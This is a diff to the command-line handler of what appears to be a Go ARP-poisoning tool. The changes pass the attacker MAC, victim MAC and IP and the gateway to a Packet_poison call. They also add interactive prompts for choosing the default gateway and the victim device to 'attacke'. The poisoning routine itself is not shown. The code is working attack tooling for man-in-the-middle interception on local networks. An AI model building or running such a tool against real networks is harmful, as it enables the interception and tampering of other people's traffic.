@@ -1,3 +1,5 @@
+// SPDX-License-Identifier: MIT
+// Copyright (c) 2025 Pythonic01
 package commandlinehandle
 
 import (
@@ -52,7 +54,7 @@ func contains(arr []string, item string) bool {
 }
 
 // add Interface name
-func checkStatic(args []string) {
+func checkStatic(args []string, handler *pcap.Handle, iface net.Interface) {
 
 	var user_command CommandLineArgs;
 	requiredFlags := []string{"-amac", "-vmac", "-vip", "-dip"}
@@ -81,8 +83,11 @@ func checkStatic(args []string) {
 		}
 
 	}
-	fmt.Println("commands ", user_command);
-	CommandLineArgsGen(user_command);
+
+	// Parsing the given arguments
+	pared := CommandLineArgsGen(user_command);
+	captureArp.Packet_poison(handler, pared);
+	
 }
 
 func checkDynamic(handler *pcap.Handle , iface net.Interface) {
@@ -117,28 +122,28 @@ func checkDynamic(handler *pcap.Handle , iface net.Interface) {
 		captureArp.Discover_devices(handler,iface.HardwareAddr , atp.IP.To4(), ch);
 	}()
 	wg.Wait()
-	target_index := print_targets(targets);
+	target_index , default_getaway_index:= print_targets(targets);
 
-	user_command.DefaultGateway = "192.168.0.1";
+	user_command.DefaultGateway = targets[default_getaway_index].TargetIp.String();
 	user_command.VictimMAC = targets[target_index].TargetMac.String();
 	user_command.VictimIP = targets[target_index].TargetIp.String();
 
 	fmt.Println("User command Structure look like this ", user_command);
 
-	something := CommandLineArgsGen(user_command);
-
-	fmt.Println("User command after parsing ", something);
-	captureArp.Packet_poison(handler, something)
+	// Parsing the given arguments
+	parsed := CommandLineArgsGen(user_command);
+	captureArp.Packet_poison(handler, parsed)
 
 
 
 }
 
-func print_targets (targets []*captureArp.Target) int {
+func print_targets (targets []*captureArp.Target) (int, int) {
 	if len(targets) == 0 {
 		log.Fatal("No device detected");
 	}
 	var target_index int;
+	var default_getaway_index int;
 	fmt.Println("Targets Found 🖥️");
 	for i, target := range targets {
 		fmt.Printf("Target ID: %d\n", i);
@@ -146,9 +151,16 @@ func print_targets (targets []*captureArp.Target) int {
 		fmt.Printf("Target MAC: %s\n", target.TargetMac.String());
 		println("--------------------------------------------");
 	}
+
+	fmt.Printf("Enter the ID of the default getaway: ");
+	fmt.Scanln(&default_getaway_index);
+	
+
 	fmt.Printf("Enter the target ID u want to attacke: ");
 	fmt.Scanln(&target_index);
-	return target_index;
+	
+
+	return target_index, default_getaway_index;
 
 
 	
@@ -165,7 +177,7 @@ func CommandLineChecker(args []string, handler *pcap.Handle, iface net.Interface
 	mode := args[1];
 	switch mode {
 	case "static":
-		checkStatic(args[2:])
+		checkStatic(args[2:], handler, iface)
 
 	case "dynamic":
 		checkDynamic(handler, iface);
@@ -180,7 +192,7 @@ func CommandLineArgsGen(args CommandLineArgs) shared.ParsedCommandLine {
 
 
 
-	fmt.Printf("[+] Parsed: %+v\n", args)
+	// fmt.Printf("[+] Parsed: %+v\n", args)
 
 	Amac, err := net.ParseMAC(args.AttackerMAC)
 	if err != nil {
